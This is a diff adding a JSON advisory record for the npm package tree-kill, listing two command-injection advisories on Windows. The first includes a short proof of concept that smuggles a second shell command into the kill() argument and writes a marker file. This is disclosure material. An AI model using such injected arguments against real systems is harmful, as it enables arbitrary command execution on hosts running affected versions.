@@ -1,0 +1,43 @@
+{
+  "name": "tree-kill",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-j7fq-p9q7-5wfv",
+      "title": "Treekill Enables OS Command Injection",
+      "description": "A Code Injection exists in treekill and tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command.\n\n### Steps To Reproduce:\nCreate the following PoC file:\n\n```js\nvar kill = require('treekill');\nkill('3333332 & echo \"HACKED\" > HACKED.txt & ');\n```\n\nExecute the following commands in terminal:\n\n```shell\nnpm i treekill # Install affected module\ndir # Check *HACKED.txt* doesn't exist\nnode poc.js #  Run the PoC\ndir # Now *HACKED.txt* exist",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-j7fq-p9q7-5wfv",
+      "publishedAt": "2022-05-24T17:04:00Z",
+      "modifiedAt": "2024-04-22T23:20:00Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-j7fq-p9q7-5wfv"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2019-15598"
+        }
+      ],
+      "affectedRange": "< 1.2.2",
+      "fixedVersion": "1.2.2"
+    },
+    {
+      "id": "GHSA-mxq6-vrrr-ppmg",
+      "title": "Duplicate Advisory: tree-kill vulnerable to remote code execution",
+      "description": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-884p-74jh-xrg2. Ths link is maintained to preserve external references.\n\n## Original Description\nA Code Injection exists in tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command, which is executed without any check. The issue arises here: `https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20` . While the Linux part is sanitized",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-mxq6-vrrr-ppmg",
+      "publishedAt": "2022-05-24T17:04:00Z",
+      "modifiedAt": "2023-11-08T20:03:29Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-mxq6-vrrr-ppmg"
+        }
+      ],
+      "affectedRange": "<= 1.2.1"
+    }
+  ]
+}
